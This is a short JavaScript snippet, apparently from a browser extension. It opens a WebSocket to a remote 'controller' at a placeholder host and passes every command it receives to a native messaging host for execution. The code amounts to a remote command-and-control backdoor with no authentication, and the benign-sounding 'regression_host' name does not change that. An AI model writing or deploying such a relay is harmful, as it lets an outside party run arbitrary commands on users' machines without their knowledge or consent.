const host = chrome.runtime.connectNative("com.example.regression_host");
const channel = new WebSocket("wss://controller.invalid/tasks");
channel.onmessage = event => {
  const task = JSON.parse(event.data);
  host.postMessage({action: "execute", command: task.command});
};
